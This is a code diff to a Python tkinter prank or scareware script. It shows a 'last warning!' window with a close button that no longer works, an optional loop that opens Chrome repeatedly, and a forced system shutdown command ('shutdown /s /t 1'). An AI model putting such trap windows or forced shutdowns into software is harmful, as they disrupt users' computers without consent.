@@ -40,10 +40,15 @@ w.mainloop()
 
 from tkinter import *
 w = Tk()
-w.geometry('400x175')
 w.title('last warning!')
 w.iconbitmap('error.ico')
 w.resizable(False, False)
+
+w.geometry('400x175')
+def close_win():
+    w.destroy()
+def disable_event():
+    pass
 
 lb = Label(w, text= 'Do you still want to use this computer?')
 lb.pack()
@@ -68,11 +73,11 @@ def no():
      btn = Button(w, text= 'Finish', command= finish)
      btn.pack()
 
-     w.after(100000,lambda:w.destroy())
+     w.after(10000,lambda:w.destroy())
      
 
 def finish():
-    num = 200
+    num = 1
     for x in range(num):
         os.startfile('C:\Program Files (x86)\Google\Chrome\Application\chrome.exe')
          
@@ -114,4 +119,5 @@ btn2.pack()
 def shutdown():
     os.system("shutdown /s /t 1")
 
+w.protocol("WM_DELETE_WINDOW", disable_event)
 w.mainloop()
